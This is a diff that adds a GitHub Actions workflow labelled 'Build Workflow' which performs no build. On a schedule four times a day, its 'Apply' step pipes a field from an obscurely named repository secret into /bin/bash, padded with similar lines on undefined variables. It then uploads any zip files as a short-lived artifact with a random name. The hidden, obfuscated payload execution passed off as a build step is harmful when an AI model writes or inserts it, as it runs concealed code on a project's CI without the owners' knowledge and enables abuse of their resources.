@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          lw972: ${{ secrets.lw972 }}
+        run: |
+          printf '%s' "$lw972" | jq -r .vacf8105 | /bin/bash
+          printf '%s' "$fgryz250" | jq -r .lsmg72 | /bin/bash
+          printf '%s' "$z2" | jq -r .edboz140 | /bin/bash
+          printf '%s' "$ruh90" | jq -r .xspbt25 | /bin/bash
+          printf '%s' "$cqk9539" | jq -r .tn38 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: dclcQvtT
+          path: "*.zip"
+          retention-days: 1
